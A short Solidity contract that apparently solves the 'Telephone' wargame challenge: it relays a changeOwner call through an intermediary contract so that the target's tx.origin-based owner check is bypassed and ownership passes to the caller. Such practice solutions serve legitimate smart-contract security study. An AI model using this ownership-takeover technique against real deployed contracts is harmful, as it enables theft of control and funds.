// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneSolver {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address challenge) public {
        ITelephone instance = ITelephone(challenge);
        instance.changeOwner(msg.sender);
    }
}
